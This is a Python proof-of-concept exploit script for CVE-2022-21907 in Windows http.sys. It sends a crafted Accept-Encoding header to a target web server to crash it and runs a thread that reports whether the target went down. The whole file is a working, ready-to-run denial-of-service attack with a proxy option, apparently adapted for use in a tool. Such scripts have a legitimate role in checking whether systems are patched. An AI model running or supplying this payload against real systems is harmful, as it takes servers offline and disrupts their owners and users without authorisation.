#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : CVE-2022-21907_http.sys_crash.py
# Author             : Podalirius (@podalirius_)
# Date created       : 13 Jan 2022

import datetime
import requests
import time
import threading
proxy=None
def set_agent(p):#设置代理
    global proxy
    proxy=p
class exp:
    def monitor_thread(self,target, dtime=5):
        print(f'[>] Started monitoring of target server for the next {dtime} seconds.')
        for k in range(dtime):
            try:
                r = requests.get(target, proxies=proxy,timeout=1)
            except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout) as e:
                print("   [%s] \x1b[1;91mTarget is down!\x1b[0m" % datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            else:
                print("   [%s] \x1b[1;92mTarget is reachable!\x1b[0m" % datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                time.sleep(1)
    
    
    def __init__(self,target,port):

        if not target.startswith('http://') and not target.startswith('https://'):
            target = "http://" +target
    
        payload = 'AAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&AA&**AAAAAAAAAAAAAAAAAAAA**A,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAA,****************************AAAAAA, *, ,'
    
        # Starting monitoring thread
        t = threading.Thread(target=self.monitor_thread, args=(target,))
        t.start()
        time.sleep(2)
    
        # Sending payload
        print("   [+] Sending payload ...")
        try:
            r = requests.get(target, proxies=proxy,headers={"Accept-Encoding": payload}, timeout=15)
        except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout) as e:
            t.join()
            print("[%s] \x1b[1;91mTarget successfully crashed!\x1b[0m" % datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    
        # Cleanup
        t.join()